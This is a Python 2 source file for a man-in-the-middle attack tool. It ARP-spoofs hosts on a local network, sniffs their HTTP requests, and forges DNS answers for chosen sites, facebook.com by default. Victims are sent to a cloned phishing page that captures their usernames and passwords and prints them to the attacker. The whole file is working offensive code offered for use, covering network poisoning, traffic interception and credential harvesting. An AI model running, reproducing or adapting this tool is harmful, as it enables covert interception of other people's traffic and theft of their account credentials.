#! /usr/bin/env python2

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from nfqueue import *

from signal import signal, pause, SIGINT, SIGKILL
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from subprocess import Popen, PIPE, STDOUT
from multiprocessing import Process, Pipe
from argparse import ArgumentParser
from threading import Thread, Lock, active_count
from socket import socket, gethostbyname, AF_INET
from urllib2 import urlopen
from cgi import FieldStorage
from re import sub
from os import kill, getpid, geteuid
from time import sleep
from sys import exit

conf.verb = 0
conf.checkIPaddr = 0

WHITE = "\033[0m"       # MAIN
GRAY = "\033[37m"       # EXTRA
RED = "\033[31m"        # CREDS


class ARPSpoof(Thread):

    def __init__(self, iface, iface_mac, gw_ip, gw_mac, host):

        Thread.__init__(self)
        self.iface = iface
        self.iface_mac = iface_mac
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.host = host
        self.vic_mac = get_mac(host)

    def run(self):

        gw_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.host,
                     hwdst=self.gw_mac, pdst=self.gw_ip)
        vic_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.gw_ip,
                      hwdst=self.vic_mac, pdst=self.host)

        while True:
            send(vic_pkt, count=2)
            send(gw_pkt, count=2)
            sniff(filter="arp and host %s" % self.host , count=1, timeout=4)

    def heal(self):

        gw_pkt = ARP(op=2, hwsrc=self.gw_mac, psrc=self.gw_ip,
                     hwdst=self.vic_mac, pdst=self.host)
        vic_pkt = ARP(op=2, hwsrc=self.vic_mac, psrc=self.host,
                      hwdst=self.gw_mac, pdst=self.gw_ip)

        send(vic_pkt, count=2)
        send(gw_pkt, count=2)


class URLInspect(Thread):

    def __init__(self, iface, host, conn,
                 skip=["ocsp", ".jpg", ".jpeg", ".gif", ".png", ".css", ".ico", ".js", ".svg"]):

        Thread.__init__(self)
        self.iface = iface
        self.host = host
        self.conn = conn
        self.skip = skip
        self.past_url = None

    def run(self):

        sniff(store=0, filter="port 80 and host %s"
              % self.host, prn=self.parse, iface=self.iface)

    def parse(self, pkt):

        if pkt.haslayer(Raw) and pkt.haslayer(TCP):
            load = repr(pkt[Raw].load)[1:-1]

            try:
                headers, body = load.split(r"\r\n\r\n", 1)

            except:
                headers = load
            header_lines = headers.split(r"\r\n")

            url = ""
            post = ""
            get = ""
            host = ""

            for l in header_lines:
                if re.search('[Hh]ost: ', l):
                    try:
                        host = l.split('Host: ', 1)[1]
                    except:
                        try:
                            host = l.split('host: ', 1)[1]
                        except:
                            pass
                if re.search('GET /', l):
                    try:
                        get = l.split('GET ')[1].split(' ')[0]
                    except:
                        pass
                if re.search('POST /', l):
                    try:
                        post = l.split(' ')[1].split(' ')[0]
                    except:
                        pass

            try:
                if host and post:
                    url = host+post
                    if len(url) > 80:
                        url = url[:77] + "..."
                    if not url == self.past_url:
                        self.conn.send(["POST",
                                       [self.host, gethostbyname(url.split("/")[0]), url]])
                        self.past_url = url
            except:
                pass

            try:
                if host and get:
                    url = host+get
                    if not any(i in url for i in self.skip):
                        if len(url) > 80:
                            url = url[:77] + "..."
                        if not url == self.past_url:
                            self.conn.send(["GET",
                                           [self.host, gethostbyname(url.split("/")[0]), url]])
                            self.past_url = url
            except:
                pass


class HTTPHandler(BaseHTTPRequestHandler):

    def __init__(self, fp, dname, conn, *args):

        self.fp = fp
        self.dname = dname
        self.conn = conn
        BaseHTTPRequestHandler.__init__(self, *args)

    def do_GET(self):

        host, port = self.client_address
        if self.path == "/":

            try:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(self.fp)
                self.wfile.close()

            except:
                self.send_error(404, "Server Not Found.")

    def do_POST(self):

        if self.path == "/login":

            environ = {'REQUEST_METHOD': 'POST', 'CONTENT_TYPE': self.headers['Content-Type']}
            form = FieldStorage(fp=self.rfile, headers=self.headers, environ=environ)

            for att in form:
                if re.search("[Ee]mail|[Uu]ser|[Uu]sername", str(att)):
                    user = form[att].value

                if re.search("[Pp]ass|[Pp]assword|[Pp]asswd", str(att)):
                    passwd =  form[att].value

            self.conn.send(["CRED", [self.dname, user, passwd]])

            try:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                html = "<meta http-equiv=\"refresh\"content=\"3; url=https://%s\" />" % self.dname
                self.wfile.write(html)
                self.wfile.close()

            except:
                pass

            self.conn.send(["STOP", None])
            os.kill(getpid(), SIGKILL)

    def log_message(self, format, *args):

        return


class WebServer(Process):

    def __init__(self, fp, dname, port, conn):

        Process.__init__(self)
        self.fp = fp
        self.dname = dname
        self.port = port
        self.conn = conn

    def handler(self, *args):

        HTTPHandler(self.fp, self.dname, self.conn, *args)

    def run(self):

        server = HTTPServer(('', self.port), self.handler)
        server.serve_forever()


class DNSSpoof(Process):

    def __init__(self, iface_ip, hosts, dnames, conn):

        Process.__init__(self)
        self.iface_ip = iface_ip
        self.hosts = hosts
        self.conn = conn
        self.fp_bank = self.get_fp_bank(dnames)
        self.server_on = False

    def run(self):

        nfq = queue()
        nfq.set_callback(self.reply)
        nfq.fast_open(0, AF_INET)
        nfq.set_mode(NFQNL_COPY_PACKET)
        nfq.try_run()

    def reply(self, pkt):

        data = IP(pkt.get_data())

        if not data.haslayer(DNSQR):
            pkt.set_verdict(NF_ACCEPT)

        else:
            ip = data[IP]
            udp = data[UDP]
            dns = data[DNS]

            dname = dns.qd.qname[:len(dns.qd.qname)-1]

            if ip.src in self.hosts:
                self.conn.send(["DNS", [ip.src, ip.dst, dname]])

                if dname in self.fp_bank.keys():
                    self.conn.send(["ATT", [ip.src, dname]])
                    pkt.set_verdict(NF_DROP)

                    if not self.server_on:
                        server_proc = WebServer(self.fp_bank[dname], dname, 80, self.conn)
                        server_proc.start()
                        self.server_on = True

                    reply = (IP(dst=ip.src, src=ip.dst) /
                             UDP(dport=udp.sport, sport=udp.dport) /
                             DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                                 an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.iface_ip)))

                    sleep(1)
                    send(reply, count=2)

    def falsify(self, html):

        # TO BE IMPLEMENTED PROPERLY
        return re.sub('action=".*?"', 'action="/login"', html)

    def get_fp_bank(self, dnames):

        self.conn.send(["STAT", "Creating fake pages"])

        fixed = []
        for dname in dnames:
            if "www" == dname.split(".")[0]:
                fixed.append(".".join(dname.split(".")[1:]))
            else:
                fixed.append("www." + dname)
            fixed.append(dname)

        fp_bank = {}
        for dname in fixed:

            try:
                hfile = urlopen("http://%s" % dname)
            except:
                self.conn.send(["STAT", "No internet!"])
                self.conn.send(["STOP", None])
                return fp_bank

            fp_bank[dname] = self.falsify(hfile.read())

        return fp_bank

class NScan(Process):

    def __init__(self, iface, hosts, conn):

        Process.__init__(self)
        self.iface = iface
        self.hosts = hosts
        self.conn = conn
        self.iface_ip = get_ip(iface)
        self.gw_ip = get_gw(iface)

    def run(self):

        p = Popen("ip route | grep -m1 -E '%s.*link.*src%s' | awk '{print $1}'" %
                  (self.iface, self.iface_ip), shell=True, stdout=PIPE)
        netid = p.communicate()[0].rstrip()

        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                         ARP(pdst=netid), timeout=5, iface=self.iface, inter=0.1)

        for snd, rcv in ans:
            if rcv.psrc not in [self.gw_ip, self.iface_ip] + self.hosts:
                self.conn.send(["HOST", rcv.psrc])


def set_forward(enable):

    if enable:
        Popen("sysctl -w net.ipv4.ip_forward=1", shell=True, stdout=PIPE, stderr=STDOUT)

    else:
        Popen("sysctl -w net.ipv4.ip_forward=0", shell=True, stdout=PIPE, stderr=STDOUT)


def set_nfq(enable):

    if enable:
        Popen("modprobe nfnetlink_queue", shell=True, stdout=PIPE, stderr=STDOUT)
        Popen("iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 0",
              shell=True, stdout=PIPE, stderr=STDOUT)

    else:
        Popen("iptables -F", shell=True, stdout=PIPE)
        Popen("iptables -t nat -F", shell=True, stdout=PIPE)
        Popen("iptables -X", shell=True, stdout=PIPE)
        Popen("iptables -t nat -X", shell=True, stdout=PIPE)


def get_ip(iface):

    p = Popen("ip route | grep %s | grep 'src' | awk '{print $9}'" % iface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def get_mac(ip, local=False):

    if ip == "255.255.255.255":
        return "ff:ff:ff:ff:ff:ff"

    if local:
        p = Popen("arp -a | grep  '(%s)' | awk  '{print $4}'" % ip,
                  shell=True, stdout=PIPE)
        output = p.communicate()[0].rstrip()
        return output
    else:
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                         ARP(pdst=ip), timeout=4, retry=2)
        for snd, rcv in ans:
            return rcv.sprintf("%Ether.src%")


def get_gw(iface):

    p = Popen("ip route show 0.0.0.0/0 dev %s | awk '{print $3}'" % iface,
              shell=True, stdout=PIPE)
    output = p.communicate()[0].rstrip()
    return output


def valid_ip(s):

    if len(s.split('.')) != 4:
        return False

    for x in s.split('.'):
        if not x.isdigit():
            return False
        if int(x) < 0 or int(x) > 255:
            return False
    return True


def get_if_list():

    f = open("/proc/net/dev", "r")
    lst = []
    f.readline()
    f.readline()

    for l in f:
        iface = l.split(":")[0].strip()
        if iface != "lo":
            lst.append(iface)
    return lst


def get_if_mac(iface):

    s = socket()
    ifreq = ioctl(s, 0x8927, struct.pack("16s16x", iface))
    s.close()
    family, mac = struct.unpack("16xh6s8x", ifreq)
    return ("%02x:"*6)[:-1] % tuple(map(ord, mac))


def get_dhcp(iface):

    dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff') /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=get_if_mac(iface)) /
            DHCP(options=[("message-type", "discover"),
                ("param_req_list",
                 chr(DHCPRevOptions["router"][0]),
                 chr(DHCPRevOptions["domain"][0]),
                 chr(DHCPRevOptions["server_id"][0]),
                 chr(DHCPRevOptions["name_server"][0]),),
                "end"]))
    ans, unans = srp(dhcp, timeout=4, retry=2)

    if ans:
        for s, r in ans:
            dhcp_opt = r[0][DHCP].options
            dhcp_ip = r[0][IP].src
            for opt in dhcp_opt:
                if 'domain' in opt:
                    local_domain = opt[1]
                    pass
                else:
                    local_domain = 'None'
                if 'name_server' in opt:
                    dns_ip = opt[1]
    else:
        dns_ip = get_gw(iface)
        dhcp_ip = dns_ip
        local_domain = 'None'

    return [dhcp_ip, dns_ip, local_domain]


def main():

    def sig_handler(signal, frame):

        child_conn.send(["STOP", None])

    signal(SIGINT, sig_handler)

    parser = ArgumentParser()

    parser.add_argument("-iface", metavar="IFACE",
                        help="select network interface [%s]" % conf.iface)

    parser.add_argument("-ip", metavar="IPADDR",
                        help="specify one or more IP addresss to attack [all]")

    parser.add_argument("-http", action="store_true",
                        help="show HTTP GET and POST traffic")

    parser.add_argument("-dns", action="store_true",
                        help="show DNS queries being requested")

    parser.add_argument("-dnames", metavar="DOMAINS",
                        help="specify one or more websites domain names to spoof [facebook.com]")
    args = parser.parse_args()

    parent_conn, child_conn = Pipe()

    if geteuid() != 0:
        exit(WHITE + "Please run as root/superuser")

    print(WHITE + "Initializing")

    if args.iface:
        iface = args.iface
    else:
        print(WHITE + "No interface specified, using default [%s]" % conf.iface)
        iface = conf.iface

    if args.dnames:
        dnames = args.dnames.split()
    else:
        dnames = ["facebook.com"]
        print(WHITE + "No domains specified, using default [facebook.com]")

    iface_ip = get_ip(iface)
    iface_mac = get_if_mac(iface)
    gw_ip = get_gw(iface)
    gw_mac = get_mac(gw_ip)

    set_forward(True)
    set_nfq(True)

    arpspoof_thrds = []
    urlinspect_thrds = []
    hosts = []

    if args.ip:
        if valid_ip(args.ip):
            print(GRAY + "Spoofing %s" % args.ip)
            hosts.append(args.ip)

            arpspoof_thrds.append(ARPSpoof(iface, iface_mac, gw_ip, gw_mac, args.ip))
            arpspoof_thrds[-1].start()

            urlinspect_thrds.append(URLInspect(iface, args.ip, child_conn))
            urlinspect_thrds[-1].start()
        else:
            exit(WHITE + "IP address is invalid")

    else:
        print(WHITE + "Scanning network")
        nscan_proc = NScan(iface, hosts, child_conn)
        nscan_proc.start()

        while True:
            if parent_conn.poll():
                recieved = parent_conn.recv()

                if recieved[0] == "HOST":
                    print(GRAY + "Host detected %s" % recieved[1])
                    hosts.append(recieved[1])

                    print(GRAY + "Spoofing %s" % recieved[1])
                    arpspoof_thrds.append(ARPSpoof(iface, iface_mac, gw_ip, gw_mac, recieved[1]))
                    arpspoof_thrds[-1].start()

                    urlinspect_thrds.append(URLInspect(iface, recieved[1], child_conn))
                    urlinspect_thrds[-1].start()

            if not nscan_proc.is_alive():
                break

            sleep(0.2)

        if hosts == []:
            print(WHITE + "No hosts detected")
            exit(0)

    dnsspoof_proc = DNSSpoof(iface_ip, hosts, dnames, child_conn)
    dnsspoof_proc.start()

    while True:

        if parent_conn.poll():
            recieved = parent_conn.recv()

            if recieved[0] == "STOP":
                print(WHITE + "Stopping")
                set_forward(False)
                set_nfq(False)
                dnsspoof_proc.terminate()

                for thrd in arpspoof_thrds:
                    print(GRAY + "Healing %s" % thrd.host)
                    thrd.heal()

                sleep(5)
                break

            if recieved[0] == "STAT":
                print(WHITE + recieved[1])

            if recieved[0] == "ATT":
                print(WHITE + "Attacking {:s} ({:s})".format(*recieved[1]))

            if recieved[0] == "DNS" and args.dns:
                print(GRAY + "{:15s} DNSQ  {:15s} {:s}".format(*recieved[1]))

            if recieved[0] == "GET" and args.http:
                print(GRAY + "{:15s} GET   {:15s} {:s}".format(*recieved[1]))

            if recieved[0] == "POST" and args.http:
                print(GRAY + "{:15s} POST  {:15s} {:s}".format(*recieved[1]))

            if recieved[0] == "CRED":
                print(RED + "Website:{:s}  Username:{:s}  Password:{:s}".format(*recieved[1]))

        sleep(0.2)

    os.kill(getpid(), SIGKILL)

if __name__ == '__main__':
    main()
